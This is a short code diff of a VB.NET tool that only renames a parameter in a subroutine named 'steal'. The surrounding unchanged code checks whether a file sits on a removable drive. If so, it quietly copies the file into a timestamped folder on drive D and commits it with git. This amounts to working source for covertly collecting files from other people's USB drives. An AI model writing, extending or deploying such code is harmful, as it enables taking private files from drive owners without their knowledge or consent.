@@ -7,18 +7,18 @@
     Public Const DRIVE_REMOTE = 4
     Public Const DRIVE_CDROM = 5
     Public Const DRIVE_RAMDISK = 6
-    Public Shared Sub steal(ppt As String)
+    Public Shared Sub steal(FilePath As String)
         Try
             Dim f As Boolean = True
-            Dim tmp As New IO.FileInfo(ppt)
+            Dim tmp As New IO.FileInfo(FilePath)
 
-            If GetDriveType(System.IO.Path.GetPathRoot(ppt)) <> DRIVE_REMOVABLE Then
+            If GetDriveType(System.IO.Path.GetPathRoot(FilePath)) <> DRIVE_REMOVABLE Then
                 f = False
             End If
             If f Then
                 Dim new_name As String = tmp.Name.Replace(tmp.Extension, "") + Format(Now(), "_yyyy_MM_dd_HH_mm_ss_ff") + tmp.Extension
                 IO.Directory.CreateDirectory("D:\课件\新建文件夹\" + Format(Now(), "yyyy_MM_dd"))
-                IO.File.Copy(ppt, "D:\课件\新建文件夹\" + Format(Now(), "yyyy_MM_dd") + "\" + new_name)
+                IO.File.Copy(FilePath, "D:\课件\新建文件夹\" + Format(Now(), "yyyy_MM_dd") + "\" + new_name)
             End If
             Dim git As New CommandRunner("C:\Program Files\Git\cmd\git.exe", "D:\课件\新建文件夹")
             logcat.Log.Logger.Instance.WriteLog(git.Run("add ."))
